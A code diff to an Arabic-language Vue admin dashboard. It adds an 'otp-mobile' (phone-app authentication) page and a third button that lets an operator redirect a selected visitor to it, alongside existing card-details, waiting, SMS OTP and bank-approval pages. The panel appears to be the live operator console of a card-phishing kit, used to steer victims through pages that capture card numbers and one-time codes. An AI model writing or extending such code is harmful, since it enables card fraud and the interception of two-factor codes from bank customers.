@@ -93,7 +93,8 @@ const pageLabels: Record<string, string> = {
   '/card-details': 'الدفع بالبطاقة',
   '/waiting': 'يرجى الانتظار',
   '/otp': 'OTP SMS',
-  '/otp-bank': 'رسالة موافقة من تطبيق البنك'
+  '/otp-bank': 'رسالة موافقة من تطبيق البنك',
+  '/otp-mobile': 'المصادقة عبر تطبيق الهاتف'
 };
 
 const redirectOptions = [
@@ -104,7 +105,8 @@ const redirectOptions = [
   { value: '/card-details', label: 'الدفع بالبطاقة' },
   { value: '/waiting', label: 'يرجى الانتظار' },
   { value: '/otp', label: 'OTP SMS' },
-  { value: '/otp-bank', label: 'رسالة موافقة من تطبيق البنك' }
+  { value: '/otp-bank', label: 'رسالة موافقة من تطبيق البنك' },
+  { value: '/otp-mobile', label: 'المصادقة عبر تطبيق الهاتف' }
 ];
 
 const stepFallbackPage: Record<string, string> = {
@@ -1133,20 +1135,27 @@ const filteredRequests = computed(() => {
 
                   <div class="space-y-2">
                     <p class="text-xs text-gray-600 mb-2">توجيه الزائر لصفحة التحقق المطلوبة:</p>
-                    <div class="flex flex-col sm:flex-row gap-2">
+                    <div class="grid grid-cols-1 sm:grid-cols-3 gap-2">
                       <button
                         @click="updateNextAction(selectedRequest.id, 'otp-sms')"
-                        class="flex-1 bg-[#1976d2] hover:bg-[#1565c0] text-white py-2 px-3 rounded text-xs font-bold transition-colors cursor-pointer flex items-center justify-center gap-1.5"
+                        class="bg-[#1976d2] hover:bg-[#1565c0] text-white py-2 px-2 rounded text-xs font-bold transition-colors cursor-pointer flex items-center justify-center gap-1"
                       >
                         <Smartphone class="w-3.5 h-3.5" />
                         <span>OTP SMS</span>
                       </button>
                       <button
                         @click="updateNextAction(selectedRequest.id, 'otp-bank')"
-                        class="flex-1 bg-gray-800 hover:bg-gray-900 text-white py-2 px-3 rounded text-xs font-bold transition-colors cursor-pointer flex items-center justify-center gap-1.5"
+                        class="bg-gray-800 hover:bg-gray-900 text-white py-2 px-2 rounded text-xs font-bold transition-colors cursor-pointer flex items-center justify-center gap-1"
                       >
                         <Building2 class="w-3.5 h-3.5" />
-                        <span>رسالة موافقة من تطبيق البنك</span>
+                        <span>رسالة البنك</span>
+                      </button>
+                      <button
+                        @click="updateNextAction(selectedRequest.id, 'otp-mobile')"
+                        class="bg-[#008a40] hover:bg-[#007335] text-white py-2 px-2 rounded text-xs font-bold transition-colors cursor-pointer flex items-center justify-center gap-1"
+                      >
+                        <Smartphone class="w-3.5 h-3.5" />
+                        <span>تطبيق الهاتف</span>
                       </button>
                     </div>
                     <button
